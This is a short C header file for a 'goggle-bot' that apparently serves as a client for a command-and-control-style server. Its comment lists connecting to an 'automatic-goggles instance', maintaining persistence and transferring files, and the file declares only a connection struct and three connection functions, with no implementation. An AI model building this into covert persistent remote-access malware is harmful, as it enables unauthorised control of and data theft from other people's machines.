/*
 * goggle-bot.h
 *
 * defines basic functionality of a goggle-bot that a user
 * can easily add on to. This allows for custom bots needed for
 * unique situations.
 *
 * Basic Functions:
 * 	Connect to automatic-goggles instance.
 * 	Maintain persistence.
 * 	Download/Upload files.
 */ 

#ifndef GOGGLE_BOT_H
#define GOGGLE_BOT_H

struct S_CONN{
	char *host;
	int port;
	int sock;
};

int bot_connect(char* host, int port);
int bot_poll_connection(struct S_CONN);
int bot_kill_connection(struct S_CONN);

#endif
